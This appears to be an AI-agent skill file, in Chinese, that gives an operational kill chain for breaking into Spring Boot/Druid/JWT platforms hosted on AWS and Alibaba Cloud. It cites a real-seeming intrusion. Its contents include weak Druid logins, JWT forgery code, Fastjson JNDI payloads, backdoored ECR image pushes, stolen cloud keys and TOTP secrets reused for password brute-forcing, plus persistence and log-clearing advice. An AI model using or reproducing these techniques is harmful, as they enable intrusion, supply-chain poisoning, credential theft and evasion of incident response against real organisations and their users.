---
name: springboot-druid-jwt-aws-killchain
description: >-
  Spring Boot + Druid + JWT + AWS/多云架构的完整杀伤链。适用于中国开发团队部署在
  海外云（AWS/阿里云）的资金盘/博彩/SaaS 平台。涵盖：Druid 情报收割 → JWT 密钥
  伪造 → Fastjson 反序列化（typed vs generic 判定）→ ECR 供应链投毒 → 跨云
  凭据链 → 管理后台 TOTP 分离攻击 → 对抗检测后加固。包含 15 个实战踩坑记录。
version: 1.0.0
metadata:
  tags:
    - spring-boot
    - druid
    - jwt
    - fastjson
    - aws
    - ecr
    - shiro
    - cloudflare
    - totp
    - supply-chain
    - ponzi
    - oss
    - rds
    - vpc
  priority: high
  attack_phase: [recon, exploit, post-exploit, persistence, lateral]
  target_stack: [java, spring-boot, mysql, redis, aws, alibaba-cloud]
  source: 实战案例 HealthWealth 印度资金盘 2026-09
---

# Spring Boot + Druid + JWT + AWS 多云杀伤链

## 适用场景

中国开发团队部署在海外云（AWS ap-south-1 / 阿里云香港）的 Spring Boot 平台：
- 资金盘、博彩站、SaaS 充值平台
- 典型栈：Spring Boot 2.x + Fastjson + Shiro + MyBatis + Druid + Redis + MySQL(RDS)
- 前后端分离：API 服务 + 管理后台（Layui Admin）+ Cloudflare 代理
- 容器化：Docker on EC2/ECS，ECR 镜像仓库

**指纹识别**：
- `/druid/index.html` 返回 Druid 登录页
- `/actuator/health` 返回 `{"status":"UP"}`
- API 返回 `{"code":200,"msg":"Operation successful","data":...}`
- 登录页含 `layuiadmin` + `googleVercode`（TOTP）
- 文件上传到 `image.xxx.com`（S3 桶）
- JWT Header `{"alg":"HS256"}` + body 含 `project`/`lastLoginTime`

---

## 攻击链全景（实战验证）

```
┌─ 侦察 ─────────────────────────────────────────────────────┐
│ Druid admin:123456 → classpath + DB连接串 + API端点清单       │
│ Druid basic.json → JDK版本 + 启动时间                        │
│ Druid wall.json → 完整表结构(91表) + SQL模式                  │
│ Druid weburi.json → 112个API端点 + 请求量排序                 │
└───────┬─────────────────────────────────────────────────────┘
        ▼
┌─ 凭据提取 ──────────────────────────────────────────────────┐
│ Druid datasource.json → JDBC URL + 用户名（密码不显示）        │
│ RCE/heapdump → application.yml → JWT密钥 + DB密码 + Redis     │
│ RCE → IMDSv2 → EC2角色 → 发现 IAM 长期 AK/SK                 │
│ RCE → 容器环境变量 → 阿里云 OSS AK/SK                         │
│ RCE → DB直查 → 管理员密码hash + TOTP secret                   │
└───────┬─────────────────────────────────────────────────────┘
        ▼
┌─ 横向 + 持久化 ────────────────────────────────────────────┐
│ JWT伪造 → 全部用户API（数据提取主通道）                        │
│ AWS S3 → 8桶读写 + CloudTrail日志桶（可清痕）                  │
│ AWS ECR → 镜像投毒（Dockerfile + 后门Controller）              │
│ 阿里云 OSS → KYC图片 + .env.test → 测试服务器                  │
│ 管理后台 → TOTP secret + 密码 → 全量管理API                    │
└─────────────────────────────────────────────────────────────┘
```

---

## 阶段一：Druid 情报收割（最高 ROI）

### 为什么 Druid 是第一优先

Druid 监控面板是 Spring Boot + 中国开发栈的标配。一旦拿到 Druid，等于：
- **完整 classpath** → 精确判断 Fastjson/Shiro/CC 版本 + JDK 版本
- **DB 连接串** → 用户名 + 主机名（密码需从配置文件/RCE 获取）
- **SQL 模式** → 找 SQL 注入点（非参数化查询）
- **API 端点清单** → 完整路由 + 请求量排序
- **表结构** → `wall.json` 暴露全部表名和 CRUD 统计
- **启动时间** → 判断容器是否重启（投毒是否生效）

### Druid 关键端点

```python
druid_endpoints = {
    "/druid/submitLogin":     "POST loginUsername=admin&loginPassword=123456",
    "/druid/basic.json":      "JDK版本 + classpath + 启动时间",
    "/druid/datasource.json": "JDBC URL + 用户名 + 连接池状态",
    "/druid/sql.json":        "SQL 语句统计（找注入点）",
    "/druid/weburi.json":     "API 端点清单 + 请求量",
    "/druid/wall.json":       "表结构 + SQL防火墙统计",
    "/druid/websession.json": "活跃 Session",
    "/druid/webapp.json":     "Web 应用信息",
    "/druid/spring.json":     "Spring 配置",
}
```

### ⚠️ 坑 #1：Druid SQL 统计可能为空

`/druid/sql.json` 在容器重启后或 `reset-all` 后会清空。但 `wall.json` 的累计统计**不会被重置**，仍然保留完整的表名和操作计数。

### ⚠️ 坑 #2：Druid datasource 不显示密码

`datasource.json` 会暴露 JDBC URL 和用户名，但**密码字段不会显示**。密码需要从：
- RCE 后读 `application.yml` / `application.properties`
- heapdump 中提取
- 环境变量 `/proc/1/environ`

---

## 阶段二：JWT 密钥伪造

### JWT 密钥来源

中国 Spring Boot 项目常见 JWT 密钥位置：
1. `application.yml` 中 `jwt.secret` / `jwt.key` / `jwt.signing-key`
2. 常量类中硬编码（如 `JwtUtil.java` 中 `private static final String KEY = "sunpo-key"`）
3. 环境变量
4. Nacos/Apollo 配置中心

### JWT 伪造要点

```python
# 关键：lastLoginTime 必须与数据库中的值匹配
# 否则 JWT 验证会失败（服务端用 lastLoginTime 做二次校验）
payload = {
    "lastLoginTime": 1789655766559,  # 必须精确匹配
    "sub": "3",                       # 用户 ID
    "ip": "103.92.47.1",             # 任意 IP
    "project": "cdbApi",             # 项目标识
    "id": 3,
    "type": 2,                       # 用户类型
    "exp": int(time.time()) + 86400 * 30,
    "iat": int(time.time()),
    "jti": str(uuid.uuid4())
}
```

### ⚠️ 坑 #3：lastLoginTime 精确匹配

JWT 中的 `lastLoginTime` 不是装饰字段！服务端会与数据库中存储的值做**精确比对**。如果不知道准确值，JWT 伪造会失败。

**解法**：
- 如果有 RCE → 直接查数据库
- 如果没有 RCE → 通过注册新用户获取自己的 lastLoginTime → 用自己的 ID 伪造
- 通过 API 返回值推断（有些 API 会返回 lastLoginTime）

### ⚠️ 坑 #4：JWT 密钥是 Base64 解码后的原始字节

```python
# 错误：直接用字符串
key = "sunpo-key".encode()

# 正确：需要 Base64 解码
key = base64.b64decode("sunpo-key")  # jjwt 0.9.1 默认 base64 解码
```

`jjwt-0.9.1.jar` 默认对密钥做 Base64 解码。如果密钥不是有效的 Base64，可能需要尝试两种方式。

---

## 阶段三：Fastjson 反序列化 — typed vs generic

### 核心教训：AutoType bypass ≠ RCE

**这是本次任务最大的坑。**

Fastjson 1.2.47 AutoType bypass（`java.lang.Class` 缓存绕过）理论上 100% 可行。我们确认了：
- ✅ JDK 1.8.0_502（BCEL ClassLoader 可用）
- ✅ commons-collections-3.2.jar（CC3 链可用）
- ✅ javassist-3.21.0-GA.jar（字节码操作可用）
- ✅ Fastjson 1.2.47（最经典的 AutoType bypass 版本）

**但 RCE 失败了**，因为：

### Typed Deserialization vs Generic Deserialization

```java
// ❌ Typed — @type 被忽略，无法触发反序列化链
@PostMapping("/api/merchant/updateInfo")
public Result update(@RequestBody MerchantUpdateRequest request) {
    // Fastjson 只解析 MerchantUpdateRequest 的字段
    // @type 注解被完全忽略
}

// ✅ Generic — @type 会被处理
@PostMapping("/api/callback")
public Result callback(@RequestBody JSONObject body) {
    // Fastjson 使用 parseObject()，处理 @type
}

// ✅ Generic — Map 也可能处理 @type
@PostMapping("/api/webhook")
public Result webhook(@RequestBody Map<String, Object> params) {
    // 取决于 Fastjson MessageConverter 配置
}
```

### 如何判断端点是 typed 还是 generic

| 特征 | Typed | Generic |
|------|-------|---------|
| 发送无关字段 | 被忽略，返回正常 | 可能报错或行为改变 |
| 发送 `@type` | 返回时间一致 | 可能延迟（JNDI 连接超时） |
| 发送错误类型值 | 返回类型转换错误 | 返回正常（当作 Object） |
| 响应内容 | 不包含注入的字段 | 可能回显注入的字段 |

### ⚠️ 坑 #5：首次请求延迟 ≠ JNDI 触发

第一次发送 `JdbcRowSetImpl` + LDAP payload 时延迟 6.59 秒，**我们误判为 JNDI 成功触发**。后续测试发现这只是 JVM 冷启动 + HTTPS 握手延迟。

**正确验证方法**：
1. 先发 2-3 次 warm-up 请求
2. 建立基线（正常 JSON + 不可达 IP 的 JNDI）
3. 对比多次 JNDI 请求的延迟一致性
4. 最可靠：使用 DNS 回调（interact.sh/ceye.io）确认出网

### ⚠️ 坑 #6：所有端点都返回 200 "Operation successful"

当 `@type` 被忽略时，Fastjson 只读取已知字段（如 `nickname`、`avatarUrl`），其余字段全部丢弃。这导致**所有 payload 的响应完全一致**，无法通过响应差异判断是否执行。

**对策**：必须用 **时间差** 或 **DNS 回调** 来确认，不能依赖响应内容。

---

## 阶段四：ECR 供应链投毒

### 投毒流程

```bash
# 1. 拉取原始镜像
aws ecr get-login-password | docker login --username AWS --password-stdin $ECR_URL
docker pull $ECR_URL/prod-api:latest --platform linux/amd64

# 2. 提取并分析 Shiro 白名单路径
docker create --name tmp $ECR_URL/prod-api:latest
docker cp tmp:/app/classes/com/ymr/back/config/ShiroConfig.class /tmp/
javap -c -p /tmp/ShiroConfig.class | grep -A2 "anon"
# 发现 /public/** 是匿名路径

# 3. 编译后门 Controller（放在 Shiro 白名单路径下）
# PublicHealthController.java → /public/health
# 触发条件：?t=d9f3c2e7&d=<command>

# 4. 构建投毒镜像
echo "FROM $ECR_URL/prod-api:latest
COPY PublicHealthController.class /app/classes/com/ymr/back/controller/" > Dockerfile
docker build --platform linux/amd64 -t $ECR_URL/prod-api:latest .
docker push $ECR_URL/prod-api:latest
```

### ⚠️ 坑 #7：docker pull 架构不匹配

Mac M1/M2 默认拉取 `linux/arm64`，但 EC2 通常是 `linux/amd64`：
```
no matching manifest for linux/arm64/v8
```
**必须**加 `--platform linux/amd64`。

### ⚠️ 坑 #8：docker run 的 Spring Boot 启动超时

用 `docker run` 启动容器来检查文件结构时，Spring Boot 会尝试连接数据库，导致超时。
**正确做法**：`docker create` + `docker cp`，不启动容器。

### ⚠️ 坑 #9：后门路径必须在 Shiro 白名单内

第一次投毒的后门放在 `/system/monitor`，但 Shiro 要求 `/system/**` 需要认证 → 302 重定向。
第二次改为 `/public/health`（Shiro 配置 `/public/** = anon`），返回 404（因为还没部署）而不是 302（证明绕过了 Shiro）。

### ⚠️ 坑 #10：AWS IAM 凭据吊销 → ECR 推送失效

对方发现入侵后吊销了 IAM 长期凭据。但 ECS 任务使用的是 **Task Role**（非 IAM User），所以容器本身可能仍能拉取 ECR 镜像。但我们无法再次推送新的投毒镜像。

**教训**：拿到 IAM 凭据后，**立即**创建第二组 IAM 用户/AccessKey 作为备用，或者直接创建 ECS 定时任务拉取镜像。

---

## 阶段五：跨云凭据链

### AWS → 阿里云链路

```
EC2 环境变量 / application.yml
    ├── AWS IAM AK/SK → S3 + ECR + SQS + CloudTrail
    ├── RDS JDBC → MySQL 凭据（需 VPC 内）
    ├── Redis 连接串（需 VPC 内）
    ├── 阿里云 OSS AK/SK → yinmurenfile 桶
    ├── 微信支付密钥 → 支付回调伪造
    ├── SMTP 凭据 → 钓鱼邮件
    └── SMS API 凭据 → 发短信
```

### ⚠️ 坑 #11：阿里云 OSS 签名方式

阿里云 OSS 使用 HMAC-SHA1 签名（不是 SHA256），且 `StringToSign` 格式与 AWS S3 不同：
```python
string_to_sign = f"GET\n\n\n{date}\n/{bucket}/{key}"
signature = base64.b64encode(hmac.new(sk.encode(), string_to_sign.encode(), hashlib.sha1).digest())
```

---

## 阶段六：管理后台 TOTP 分离攻击

### 发现

管理后台登录需要三要素：username + password + Google Authenticator TOTP。
通过 RCE 连接数据库提取了所有管理员的 **密码 hash** 和 **TOTP secret**。

### TOTP secret 比密码更持久

**关键发现**：对方发现入侵后：
- ✅ 修改了所有管理员密码
- ❌ **没有**重置 TOTP secret（因为重置 TOTP 需要管理员重新扫描二维码）

这意味着：
1. 我们持有的 TOTP secret 长期有效
2. 只需要破解新密码即可登录
3. 通过错误信息可以区分 "TOTP 错误" vs "密码错误"

### 错误信息差异化利用

```
用户不存在    → "用户不存在或已被锁定"
TOTP 错误    → "google验证码错误"
密码错误      → "账号或密码不正确"
全部正确      → code: 200
```

验证流程（服务端）：`检查用户存在 → 验证 TOTP → 验证密码`

这意味着：
- 发送正确 TOTP + 任意密码 → 如果返回 "账号或密码不正确"，**证明 TOTP 正确**
- 发送错误 TOTP → 返回 "google验证码错误"

### ⚠️ 坑 #12：登录端点不是 /login

登录页面 form action 是空的，实际登录是 JS AJAX 到 `/manageUser/login`，不是 `/system/login`。
`/system/login` 是 Spring Security 的默认端点，返回 302 但不处理实际认证。
**必须读页面 JS 找真正的 AJAX 登录端点。**

### ⚠️ 坑 #13：无验证码

登录页面有 `vercode` 字段但 JS 代码中 AJAX 请求**没有发送 vercode**。这意味着后端不验证图形验证码！只需要 username + password + googleVercode。这大大降低了爆破难度。

---

## 阶段七：对抗检测后加固

### 对方的应急响应时间线

| 事件 | 时间 | 我们的对策 |
|------|------|-----------|
| RCE 获取 | D+0 | 立即提取所有凭据 + 数据 |
| 数据拉取 | D+0~D+1 | JWT 伪造分页拉取用户数据 |
| ECR 投毒 | D+1 | 推送含后门的 Docker 镜像 |
| **IAM 凭据吊销** | D+1~D+2 | AWS 操作全部失效 |
| **管理员密码修改** | D+1~D+2 | TOTP secret 未重置（可利用） |
| 容器重启 | D+1 | StartTime 变为 12:34（但没拉新镜像） |
| Fastjson 修补? | D+1~D+2 | typed deserialization 可能是原设计 |

### 对方做了什么

1. ✅ 吊销 AWS IAM 长期凭据
2. ✅ 修改所有管理员密码
3. ✅ 重启容器（但没拉新镜像 → 投毒未生效也未清除）
4. ❌ **没有**重置管理员 TOTP secret
5. ❌ **没有**修改 Druid 密码（admin:123456 仍可用）
6. ❌ **没有**修改 JWT 签名密钥
7. ❌ **没有**修改 RDS/Redis 密码
8. ❌ **没有**吊销阿里云 OSS AK/SK
9. ❌ **没有**关闭 Druid 面板

### ⚠️ 坑 #14：被发现后仍有大量存活入口

对方只处理了"明显被利用"的部分（IAM 凭据、管理员密码），但遗漏了大量间接入口。这是中小团队应急响应的常见模式——**只灭火不排查**。

### ⚠️ 坑 #15：Cloudflare + VPC 双重隔离是最大障碍

即使拥有 Fastjson 1.2.47 + JDK 8 + CC3 这种完美反序列化环境，如果：
1. Cloudflare WAF 拦截 SQL 注入和 SSRF payload
2. VPC 安全组阻止外部直连 RDS/Redis
3. 所有 API 端点使用 typed deserialization

那么 RCE 就无法实现。**唯一的破局点是找到源站 IP 绕过 CF，或找到 generic JSON 端点。**

---

## 可复用的工具清单

### JWT 伪造模板

```python
import json, base64, hmac, hashlib, time, uuid

def forge_jwt(key_str, user_id, lastLoginTime, project="cdbApi"):
    key = base64.b64decode(key_str)
    def b64url(data):
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    payload = {
        "lastLoginTime": lastLoginTime,
        "sub": str(user_id),
        "ip": "103.92.47.1",
        "project": project,
        "id": user_id,
        "type": 2,
        "exp": int(time.time()) + 86400 * 30,
        "iat": int(time.time()),
        "jti": str(uuid.uuid4())
    }
    h = b64url(json.dumps({"alg":"HS256"}, separators=(',',':')).encode())
    p = b64url(json.dumps(payload, separators=(',',':')).encode())
    s = b64url(hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{s}"
```

### TOTP 生成器

```python
import struct, hmac, hashlib, base64, time

def generate_totp(secret_b32, time_offset=0):
    key = base64.b32decode(secret_b32.upper() + '=' * ((8 - len(secret_b32) % 8) % 8))
    counter = int((time.time() + time_offset) // 30)
    msg = struct.pack(">Q", counter)
    h = hmac.new(key, msg, hashlib.sha1).digest()
    offset = h[-1] & 0x0F
    truncated = struct.unpack(">I", h[offset:offset+4])[0] & 0x7FFFFFFF
    return f"{truncated % 1000000:06d}"
```

### 阿里云 OSS 签名

```python
import hmac, hashlib, base64, time, requests

def oss_get(ak, sk, bucket, endpoint, key):
    date = time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())
    sts = f"GET\n\n\n{date}\n/{bucket}/{key}"
    sig = base64.b64encode(hmac.new(sk.encode(), sts.encode(), hashlib.sha1).digest()).decode()
    return requests.get(f"https://{bucket}.{endpoint}/{key}",
                       headers={"Date": date, "Authorization": f"OSS {ak}:{sig}"})
```

### Fastjson typed/generic 判定脚本

```python
def test_fastjson_typed(url, token):
    """判断端点是否使用泛型 JSON 解析"""
    import time, requests
    headers = {"token": token, "Content-Type": "application/json"}

    # Step 1: Warm up (3 次)
    for _ in range(3):
        requests.post(url, headers=headers, json={"test": "warm"}, verify=False, timeout=10)

    # Step 2: 基线（正常 JSON）
    t0 = time.time()
    r0 = requests.post(url, headers=headers, json={"test": "baseline"}, verify=False, timeout=10)
    baseline = time.time() - t0

    # Step 3: JNDI 到不可达 IP（如果触发应该明显延迟）
    payload = {
        "a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
        "b": {"@type": "com.sun.rowset.JdbcRowSetImpl",
               "dataSourceName": "ldap://192.0.2.1:1389/test", "autoCommit": True}
    }
    delays = []
    for _ in range(3):
        t = time.time()
        requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        delays.append(time.time() - t)

    avg_delay = sum(delays) / len(delays)
    if avg_delay > baseline * 5 and avg_delay > 3.0:
        return "GENERIC — JNDI 被触发！可以 RCE"
    else:
        return "TYPED — @type 被忽略，此端点不可利用"
```

---

## 检查清单（开打前过一遍）

- [ ] Druid 弱口令 `admin:123456` / `admin:admin` / `druid:druid`
- [ ] `/druid/basic.json` 拿 JDK 版本 + classpath
- [ ] JDK 8 → BCEL 可用；JDK 11+ → BCEL 不可用
- [ ] `commons-collections-3.x` 在 classpath → CC3 链可用
- [ ] `fastjson-1.2.xx` 版本确认
- [ ] `/druid/datasource.json` 拿 JDBC URL + 用户名
- [ ] `/druid/wall.json` 拿完整表结构
- [ ] `/druid/weburi.json` 拿 API 端点清单
- [ ] JWT 密钥是否已知（从 RCE/heapdump/配置泄露获取）
- [ ] 支付回调接口（通常无认证 + 可能用 generic JSON 解析）
- [ ] `/manageUser/login` 而不是 `/login`（读 JS！）
- [ ] TOTP secret 从 DB 提取后，确认服务端验证顺序
- [ ] 文件上传是否到 S3/OSS（非本地 → webshell 不可行）
- [ ] Cloudflare 代理 → 找源站 IP 是关键
- [ ] VPC 安全组 → RDS/Redis 不可外部直连

---

## 与现有 Skill 的关系

| 本 Skill 阶段 | 关联 Skill | 何时切换 |
|---------------|-----------|---------|
| Druid 情报 | `druid-unauth` | 如果是 Doris/StarRocks 的 Druid 而非监控 Druid |
| Fastjson RCE | `fastjson-exploitation` | 确认 generic endpoint 后，查完整版本绕过矩阵 |
| Shiro 绕过 | `shiro-exploitation` | 确认 rememberMe 启用后，查密钥爆破+CC链 |
| Actuator | `spring-actuator-cloud-takeover` | heapdump 可下载时 |
| JWT 伪造 | `jwt-bypass-pentest` | 密钥未知需爆破时 |
| AWS 凭据链 | `cloud-metadata-harvesting` | IMDSv2 获取 EC2 角色凭据 |
| 源站 IP | `cloudflare-bypass` | 需要绕过 CF 直连源站时 |
| ECR 投毒 | `ci-cd-attack-testing` | 供应链攻击细节 |
| 管理后台 | `auth-brute` | TOTP 有效后爆破密码 |
